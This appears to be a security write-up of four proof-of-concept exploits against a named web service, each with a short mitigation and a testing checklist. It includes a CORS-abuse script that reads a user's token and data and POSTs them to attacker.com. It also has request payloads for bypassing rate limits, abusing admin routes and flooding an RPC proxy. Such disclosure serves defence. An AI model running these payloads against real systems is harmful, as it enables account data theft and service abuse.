# Security Proof-of-Concept Exploits

**⚠️ WARNING: These are for security testing only. Do not use maliciously.**

## 1. CORS Bypass Exploit

If CORS is misconfigured (allows all origins), an attacker's website can make authenticated requests:

```html
<!-- Attacker's malicious website -->
<script>
// Steal user's data if they're logged into seisoai.com
fetch('https://seisoai.com/api/auth/me', {
  credentials: 'include',
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('token')
  }
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker's server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
</script>
```

**Mitigation:** Restrict CORS to specific origins only.

---

## 2. Rate Limiting Bypass

The free image limiter skips rate limiting if `walletAddress`, `userId`, or `email` is in the body:

```javascript
// Bypass rate limiting by including any identifier
fetch('https://seisoai.com/api/generate/image', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    prompt: 'test',
    walletAddress: '0x0000000000000000000000000000000000000000' // Fake address
  })
});
```

**Mitigation:** Only skip rate limiting for authenticated JWT users.

---

## 3. Admin Secret in Body (if logged)

If request bodies are logged, admin secret could be exposed:

```javascript
// If admin routes log request bodies, this could leak
fetch('https://seisoai.com/api/admin/add-credits', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    adminSecret: 'stolen-secret',
    userId: 'target-user',
    credits: 1000000
  })
});
```

**Mitigation:** Only accept admin secret from Authorization header.

---

## 4. RPC Method Abuse

RPC proxy forwards arbitrary methods without validation:

```javascript
// Could abuse RPC methods
fetch('https://seisoai.com/api/solana/rpc', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    method: 'getProgramAccounts', // Expensive operation
    params: [/* large params to exhaust resources */]
  })
});
```

**Mitigation:** Whitelist allowed RPC methods and validate parameters.

---

## Testing Checklist

To test these vulnerabilities:

1. **CORS Test:**
   - Create a test HTML page on a different domain
   - Try to make authenticated requests
   - If successful, CORS is misconfigured

2. **Rate Limiting Test:**
   - Make multiple free image requests with fake walletAddress
   - If not rate limited, bypass exists

3. **Admin Secret Test:**
   - Check server logs for admin secret exposure
   - Verify admin routes only accept header-based auth

4. **RPC Validation Test:**
   - Try calling non-standard RPC methods
   - If accepted, validation is missing

---

**Remember:** Only test on your own systems with proper authorization!

